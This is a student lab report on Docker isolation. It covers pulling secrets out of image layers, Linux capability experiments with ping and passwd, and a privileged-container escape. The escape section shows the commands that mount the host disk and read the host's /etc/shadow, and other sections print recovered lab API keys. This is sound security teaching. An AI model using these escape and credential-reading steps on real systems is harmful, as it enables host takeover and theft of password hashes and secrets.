# M2 Isolation - Lab Report (Q1-Q17)

**Team:** team10

**Students:**

| Student number | Name           |
|----------------|----------------|
| 1210891        | Sérgio Cardoso |
| 1221294        | João Pinto     |
| 1240374        | Shijo George   |
| 1250446        | Vitor  Santos  |


This is a consolidated report built from the repository READMEs (`part-1/`,
`part-2/`, `part-3/`, and `m2-isolation/README.org`), backed by the raw
proof-of-work artifacts under `TARGETS/`. All recovered secrets, capability
bitmasks and command outputs come from the team's own runs on the assigned VM
(`decys`); AI use is disclosed in `TARGETS/AI-DISCLOSURE.md`.


## Part 1 - Keeping secrets out of images

Tags `insecurelabs01:team10` and `insecurelabs02:team10`. Artifacts:
`TARGETS/target-2/`, `TARGETS/target-4/`, `TARGETS/secrets.csv`,
`part-1/screenshots/`.

**Recovered secrets (team10):**

| Source tag | API_KEY | USER |
| --- | --- | --- |
| `insecurelabs01:team10` | `430b3b1c-2535-4d96-855f-7d2b352552ca` | `user01_team10` |
| `insecurelabs02:team10` | `1a337a1c-2fa2-4502-874f-9be76f3c94ed` | `user02_team10` |

Layer SHA-256 that first added `app/.env` in `insecurelabs02:team10`:

```
379746824d9df3c845574a5a266d9631fa46e711f6537bbe1ed9f8ab90f3e17b
```

### Q1 - What is the issue here?
The `.env` file gets bundled with the Docker image. Since the image is
published publicly on Docker Hub, the secrets baked into it are exposed.

### Q2 - Can you recover the actual secrets from the image?
Yes, by connecting to the container and reading `/app/.env`:

```sh
docker exec -it <container-id> cat /app/.env

API_KEY=430b3b1c-2535-4d96-855f-7d2b352552ca
USER=user01_team10
```

Artifact: `TARGETS/target-2/.env`, `part-1/screenshots/screenshot-dotenv.png`.

### Q3 - What do you think of Tom's fix?
At first glance it looks fine. The `.env` file is no longer present under
`/app`, and `find` does not return anything useful:

```sh
docker exec -it <container-id> find . -iname "env"
/usr/bin/env
```

What comes to mind is whether `rm` can be reverse-engineered to trace back to
the file. An AI-assisted search ("reverse engineer rm") returns: because `rm`
only destroys the metadata pointers (the map to the data) rather than
overwriting the actual data blocks, the physical bits remain on the drive
temporarily.

### Q4 - Is it possible to recover the new API key now?
Yes.

**dive.** Using [`dive`](https://github.com/wagoodman/dive), each command in a
Dockerfile maps to a *layer*, so an intermediate layer can be inspected to
retrieve the `.env`. (dive's Extract option in the tree view was not working on
macOS at the time - issue
[#687](https://github.com/wagoodman/dive/issues/687), fix in PR
[#693](https://github.com/wagoodman/dive/pull/693), not yet merged.)

**docker save.** `docker save` writes the image to a `.tar`; the layers are
compressed blobs under `blobs/sha256/`. For each blob: extract it, grep for the
`.env`, and keep it if found. This is what `TARGETS/target-4/scripts/run.sh`
does (`docker save -o save.tar isepdei/insecurelabs02:team10`, then a loop over
`blobs/sha256/*`):

```sh
> ./scripts/run.sh

found in: tmp/blobs/sha256/<blob-id>
extracted: app/.env
API_KEY=1a337a1c-2fa2-4502-874f-9be76f3c94ed
USER=user02_team10
```

- Recovered: `API_KEY=1a337a1c-2fa2-4502-874f-9be76f3c94ed`, `USER=user02_team10`.
- Layer sha256 (from `TARGETS/target-4/layer_sha256.txt`):

```
379746824d9df3c845574a5a266d9631fa46e711f6537bbe1ed9f8ab90f3e17b
```

- **Why does the layer digest differ from another team's?** Each team's tag
  bakes in team-unique secrets, so the `app/.env` that `COPY . .` writes holds
  different bytes for every team. A layer's digest is the SHA-256 of that
  layer's content, so different content produces a different digest - even
  though every team builds from the same Dockerfile.
- Artifacts: `TARGETS/target-4/.env`, `TARGETS/target-4/layer_sha256.txt`,
  `part-1/screenshots/docker-dive.png`, `part-1/screenshots/screenshot-recovered.png`.

### Q5 - How would you do Scott's job differently?
1. Never place a `.env` in the image itself - provide it as a variable instead.
2. Use `.dockerignore` to make sure no secrets leak by accident.

Artifact: `part-1/screenshots/var-during-build.png`. Source:
[Docker best practices: using ARG and ENV](https://www.docker.com/blog/docker-best-practices-using-arg-and-env-in-your-dockerfiles/).


## Part 2 - Linux capabilities

Tag `capabilities01`, plus host `ping`/`passwd` experiments. Artifacts:
`TARGETS/target-12/`, `part-2/screenshots/`.

### Q6 - Removing `cap_net_raw` from ping
```sh
getcap /usr/bin/ping            # cap_net_raw=ep
sudo setcap -r /usr/bin/ping    # remove it; ping then has no file capability
```
With no capability, a non-root `ping` tries to open a raw socket, the kernel
refuses it, and ping reports the reason itself:

```sh
ping 127.0.0.1
ping: socktype: SOCK_RAW
ping: socket: Operation not permitted
ping: => missing cap_net_raw+p capability or setuid?
```

So dropping `cap_net_raw` breaks ping for ordinary users. `sudo ping` still
works, because root bypasses the capability check.

### Q7 - Make ping work again with no capability and no sudo
Yes, by restoring the Set UID bit on `ping` (`sudo chmod u+s /usr/bin/ping`). A
Set UID root binary runs with effective UID 0; root bypasses the `cap_net_raw`
check, so the raw-socket open that failed in Q6 now succeeds, with no file
capability on the binary and without typing `sudo`. ping opens the socket while
euid is 0, then drops back to the real user for the rest of its run. Video:
`part-2/screenshots/ping-video.mov`.

### Q8 - Make passwd work without Set UID
Yes. `passwd` needs elevated privilege only to edit `/etc/shadow`
(`root:shadow`, mode `640`) and its backup files. Drop the Set UID bit and grant
the capabilities those file operations need:

```sh
sudo chmod u-s /usr/bin/passwd
sudo setcap cap_chown,cap_dac_override,cap_fowner=ep /usr/bin/passwd
```

`passwd` does not overwrite `/etc/shadow` in place; it locks `/etc`, writes a
new temp file, copies the old file to `shadow-`, then fixes the new file's owner
and mode and renames it over `/etc/shadow`. Each step needs a different
override:

- **cap_dac_override** - bypass the permission bits so a non-owner can read and
  rewrite `/etc/shadow` and create the lock + temp file in `/etc`.
- **cap_chown** - the temp file is owned by the user; passwd must `chown` it back
  to `root:shadow`, which requires CAP_CHOWN.
- **cap_fowner** - bypass the "you must own the file" check for `chmod`/`utimes`
  on the shadow files the process does not own.

One capability alone is not enough. Video: `part-2/screenshots/passwd-video.mov`.

### Q9 - Why is passwd Set UID but ping is not?
- `ping` needs only one kernel privilege - to open a raw socket
  (`CAP_NET_RAW`). That privilege maps onto a single capability, so
  distributions ship `ping` with `cap_net_raw=ep` and no setuid.
- `passwd` edits `/etc/shadow` and its lock/backup files assuming they run as
  uid 0. Capturing all of that as one capability set is awkward.

The trade-off: `passwd`'s Set UID means a bug in it is a full root compromise,
so setuid binaries "must be carefully scrutinized". `ping`'s single capability
is the modern, least-privilege alternative - it just happens that `ping`'s
privilege was easy to split out and `passwd`'s was not.

### Q10 - Ten more capabilities
From `capabilities(7)`:
- **CAP_AUDIT_CONTROL** - enable/disable kernel auditing, change auditing filter
  rules, retrieve auditing status and filtering rules.
- **CAP_AUDIT_READ** - read the audit log via a multicast netlink socket.
- **CAP_AUDIT_WRITE** - write records to the kernel auditing log.
- **CAP_BLOCK_SUSPEND** - use features that can block system suspend (EPOLLWAKEUP,
  `/proc/sys/wake_lock`).
- **CAP_BPF** - privileged BPF operations (added in Linux 5.8 to separate BPF
  from the overloaded CAP_SYS_ADMIN).
- **CAP_CHECKPOINT_RESTORE** - update `/proc/sys/kernel/ns_last_pid`, use the
  clone3 set_tid feature, read other processes' `/proc/pid/map_files` symlinks
  (added in 5.9 to separate checkpoint/restore from CAP_SYS_ADMIN).
- **CAP_CHOWN** - make arbitrary changes to file UIDs and GIDs.
- **CAP_DAC_OVERRIDE** - bypass file read, write, and execute permission checks
  (DAC = discretionary access control).
- **CAP_DAC_READ_SEARCH** - bypass file-read and directory read/execute checks;
  invoke `open_by_handle_at`; use `linkat` AT_EMPTY_PATH.
- **CAP_FOWNER** - bypass permission checks that normally require the process's
  filesystem UID to match the file's UID (e.g. `chmod`, `utime`), set inode flags
  and ACLs on arbitrary files, ignore the directory sticky bit on deletion, etc.

### Q12 - Inheritable / permitted / effective capabilities in the container
Default `capabilities01` container, `grep Cap /proc/1/status`:

| field | value | meaning |
| --- | --- | --- |
| CapInh | `0000000000000000` | inheritable: empty |
| CapPrm | `00000000a80425fb` | permitted: the 14 default capabilities |
| CapEff | `00000000a80425fb` | effective: same 14 (active) |
| CapBnd | `00000000a80425fb` | bounding: caps may never exceed these 14 |
| CapAmb | `0000000000000000` | ambient: empty |

`capsh --decode=00000000a80425fb` is the Docker default set of **14**:
cap_chown, cap_dac_override, cap_fowner, cap_fsetid, cap_kill, cap_setgid,
cap_setuid, cap_setpcap, cap_net_bind_service, cap_net_raw, cap_sys_chroot,
cap_mknod, cap_audit_write, cap_setfcap. Notably **absent**: cap_sys_admin,
cap_net_admin, cap_sys_module, cap_sys_ptrace, cap_sys_time.

- Inheritable = Ambient = 0: nothing is passed across an `execve` to
  non-privileged programs.
- Permitted = Effective: every capability the container has is already active.
- Bounding = Permitted: the container can never raise a capability outside this
  default set, even for a setuid-root binary.
- `capsh --print` shows the same information symbolically (Current / Bounding /
  Ambient), i.e. the human-readable decode of the `/proc/1/status` hex.

Artifacts: `TARGETS/target-12/capsh-print.txt`, `TARGETS/target-12/proc-status.txt`.

### Q13 - ping under `--cap-drop all`, and the fix
Restarting with `--cap-drop all` empties every capability set, including the
bounding set (`CapPrm = CapBnd = 0`). The subtlety is *how* ping breaks:

```sh
docker run --name captest --cap-drop all -d -p 8000:80 isepdei/capabilities01
docker exec captest sh -c 'ping -c1 www.dei.isep.ipp.pt; echo exit=$?'
# sh: 1: ping: Operation not permitted
# exit=126
```

Fix - add back the one capability ping needs, `cap_net_raw`:

```sh
docker run --name captest --cap-drop all --cap-add net_raw -d -p 8000:80 isepdei/capabilities01
docker exec captest sh -c 'ping -c2 127.0.0.1'   # works
```


## Part 3 - Security evasion / privileged containers

Started with `docker run -d --privileged -p 80:80 isepdei/insecurelabs03`.
Artifacts: `TARGETS/target-14/`, `TARGETS/target-15/`, `part-3/screenshots/`.

### Q14 - Capabilities of the privileged container
Because of `--privileged`, the container runs with the *entire* Linux capability
set. `grep Cap /proc/1/status` inside the container:

```
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
NoNewPrivs: 0
Seccomp: 0
```

| Setting | Default container | `--privileged` |
| --- | --- | --- |
| CapEff | `00000000a80425fb` (14) | `000001ffffffffff` (41, all) |

The capabilities unlocked on top of the default set are exactly the dangerous
ones: cap_sys_admin (the "new root"), cap_sys_module (load kernel modules),
cap_sys_rawio (raw I/O on devices), cap_sys_ptrace, cap_dac_read_search,
cap_mknod, cap_sys_boot, cap_mac_admin, cap_bpf, and so on. Artifacts:
`TARGETS/target-14/proc-status.txt`, `TARGETS/target-14/capsh-print.txt`,
`TARGETS/target-14/decoded-proc-status.txt`.

### Q15 - Exploit the host
A `--privileged` container is not isolated from the host at all. Any code that
reaches root inside it (and the entrypoint already runs as root) owns the whole
host. The simplest, fully reliable exploit here is to mount the host root
filesystem, which is exactly what the pre-installed `fdisk` hints at:

```sh
# we are root inside the container; the hostname is just the container ID
docker exec lab03 hostname
2bc7bd19b726

# mount the host filesystem in the container
docker exec lab03 fdisk -l /dev/vda
/dev/vda1     2048   2203647   2201600    1G EFI System
/dev/vda2  2203648 134215679 132012032 62.9G Linux filesystem

docker exec lab03 sh -c 'mkdir -p /mnt/host && mount /dev/vda2 /mnt/host'

docker exec lab03 cat /mnt/host/etc/hostname
decys

# read the host's /etc/shadow
docker exec lab03 grep -E '^root:|^v:' /mnt/host/etc/shadow
root:*:20704:0:99999:7:::
v:$y$j9T$.FKC3Jl/41EtRJkZwG54A/...:20765:0:99999:7:::
```

We mounted host device `/dev/vda2` (62.9 GB Linux filesystem), confirmed we were
on the host by reading `/mnt/host/etc/hostname` (`decys`), and read the host's
`/etc/shadow` password hashes - full host compromise. Artifacts:
`TARGETS/target-15/transcript.txt`, `TARGETS/target-15/exploit.mov`.

### Q17 - Good practices for Docker security
The headline rule: never use `--privileged` as a fix. It was Scott's shortcut and
it is what made Q15/Q16 possible. If a container needs one specific thing, grant
that one thing, not everything. Following the
[OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html):

- **Limit capabilities, never `--privileged` (RULE #3).** Drop all capabilities
  and add back only what is needed
  (`--cap-drop=ALL --cap-add=NET_BIND_SERVICE`); pass just the device you need
  (`--device=/dev/foo`), never the whole host.
- **Set a non-root user (RULE #2)** via a `USER` line, `docker run -u`, or
  `--userns-remap`. The root entrypoint is what made the escape one step long.
- **Prevent in-container escalation (RULE #4)** with
  `--security-opt=no-new-privileges` (note `NoNewPrivs: 0` in the target-14 dump,
  the opposite of this).
- **Read-only filesystem (RULE #8):** `--read-only` with `--tmpfs` for paths that
  must be writable, and mount volumes read-only (`:ro`).
- **Scan images in CI/CD (RULE #9):** Trivy, Grype, Clair, `docker scout`; pin
  base-image digests and rebuild to pick up patches; use a minimal base
  (distroless / `-slim`) so an attacker has fewer tools - Scott even installed
  `fdisk` into the container.
- **Use Docker secrets, not baked-in env (RULE #12):** Docker secrets / BuildKit
  `RUN --mount=type=secret` rather than `ENV`, `ARG`, or `COPY`. This is the
  Part 1 mistake.
- **Protect the host and daemon (RULE #0, #1):** keep the host kernel and Docker
  Engine patched (containers share the host kernel), and never expose
  `/var/run/docker.sock` to a container (that is effectively root on the host).

All of these restate least privilege.


## Artifact index

| Question | Artifact | Location |
| --- | --- | --- |
| Q2 | recovered `.env` (insecurelabs01) | `TARGETS/target-2/.env` |
| Q4 | extracted `app/.env` + layer sha256 (insecurelabs02) | `TARGETS/target-4/` |
| Q2/Q4 | consolidated secrets line | `TARGETS/secrets.csv` |
| Q12 | default capsh/proc dumps | `TARGETS/target-12/` |
| Q14 | privileged capsh/proc + decode | `TARGETS/target-14/` |
| Q15 | fdisk/lsblk/mount transcript + exploit video | `TARGETS/target-15/` |
| all | screenshots and videos | `part-1/`, `part-2/`, `part-3/screenshots/` |

AI use is disclosed in `TARGETS/AI-DISCLOSURE.md`: AI assisted with wording,
organization and debugging; all secrets, hashes, capability bitmasks and command
outputs come from the team's own lab runs on the assigned VM.
